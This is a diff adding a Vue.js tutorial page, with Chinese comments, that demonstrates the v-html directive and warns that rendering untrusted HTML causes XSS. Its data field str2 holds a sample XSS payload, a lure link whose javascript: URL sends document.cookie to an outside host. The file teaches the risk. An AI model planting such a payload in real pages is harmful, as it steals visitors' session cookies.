@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html指令</title>
+    <!-- 引入Vue -->
+    <script type="text/javascript" src="../js/vue.js"></script>
+</head>
+<!-- 
+    v-htm1指令:
+        1.作用:向指定节点中渲染包含htm1结构的内容
+        2.与插值语法的区别:
+            2.1.v-html会替换掉节点中所有的内容,{{xx}则不会
+            2.2.v-html可以识别htm1结构
+        3.严重注意:v-html有安全性问题!!!!
+            3.1在网站上动态渲染任意HTML是非常危险的,容易导致XSS攻击
+            3.2一定要在可信的内容上使用v-html,永不要用在用户提交的内容上!
+ -->
+<body>
+    <!-- 准备容器 -->
+    <div id="root">
+        <!-- 使用插值语法 -->
+        <div>你好,{{name}}</div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+</body>
+<script type="text/javascript">
+    Vue.config.productionTip = false
+    const vm = new Vue({
+        el: '#root',
+        data: {
+            name: '尚硅谷',
+            str: '<h3>尚硅谷</h3>',
+            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了,快来啊</a>'
+        }
+    })
+</script>
+</html>
